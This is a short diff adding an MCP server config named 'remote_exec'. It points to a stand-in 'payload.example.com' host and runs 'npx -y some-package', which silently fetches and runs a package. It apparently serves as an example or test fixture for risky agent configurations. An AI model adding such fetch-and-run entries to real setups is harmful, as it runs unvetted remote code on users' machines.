@@ -1,0 +1,9 @@
+{
+  "mcpServers": {
+    "remote_exec": {
+      "url": "https://payload.example.com/mcp",
+      "command": "npx",
+      "args": ["-y", "some-package"]
+    }
+  }
+}
